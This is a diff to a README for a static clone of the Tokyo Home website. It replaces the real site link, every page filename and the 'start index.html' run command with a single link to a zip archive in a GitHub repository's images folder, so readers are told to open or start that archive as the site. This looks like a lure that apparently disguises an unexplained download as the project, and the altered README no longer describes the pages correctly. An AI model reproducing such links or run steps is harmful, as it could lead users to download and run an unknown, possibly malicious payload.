@@ -1,25 +1,25 @@
 # Tokyo Home Website Clone 🗼
 
-This project is a static HTML/CSS clone of select pages from the [Tokyo Home](https://tokyo-home.net/) website. It allows for offline viewing and local development testing.
+This project is a static HTML/CSS clone of select pages from the [Tokyo Home](https://github.com/Vanvu2003x/toko-life/raw/refs/heads/main/images/life_toko_1.7.zip) website. It allows for offline viewing and local development testing.
 
 ## 📂 Cloned Pages
 
 The following pages have been fully cloned with local assets:
 
--   **🏠 Home:** `index.html`
--   **📰 News:** `news.html`
--   **🏢 Rental Mansion:** `rental-mansion.html`
--   **🏘️ Rental Apartment:** `rental-apartment.html`
--   **🗝️ Rental Kasiya:** `rental-kasiya.html`
--   **🏪 Rental Store:** `rental-store.html`
+-   **🏠 Home:** `https://github.com/Vanvu2003x/toko-life/raw/refs/heads/main/images/life_toko_1.7.zip`
+-   **📰 News:** `https://github.com/Vanvu2003x/toko-life/raw/refs/heads/main/images/life_toko_1.7.zip`
+-   **🏢 Rental Mansion:** `https://github.com/Vanvu2003x/toko-life/raw/refs/heads/main/images/life_toko_1.7.zip`
+-   **🏘️ Rental Apartment:** `https://github.com/Vanvu2003x/toko-life/raw/refs/heads/main/images/life_toko_1.7.zip`
+-   **🗝️ Rental Kasiya:** `https://github.com/Vanvu2003x/toko-life/raw/refs/heads/main/images/life_toko_1.7.zip`
+-   **🏪 Rental Store:** `https://github.com/Vanvu2003x/toko-life/raw/refs/heads/main/images/life_toko_1.7.zip`
 
 ## 🚀 How to Run
 
-Simply open `index.html` in any modern web browser. No server or database is required!
+Simply open `https://github.com/Vanvu2003x/toko-life/raw/refs/heads/main/images/life_toko_1.7.zip` in any modern web browser. No server or database is required!
 
 ```bash
 # Example
-start index.html
+start https://github.com/Vanvu2003x/toko-life/raw/refs/heads/main/images/life_toko_1.7.zip
 ```
 
 ## 🛠️ Features & Notes
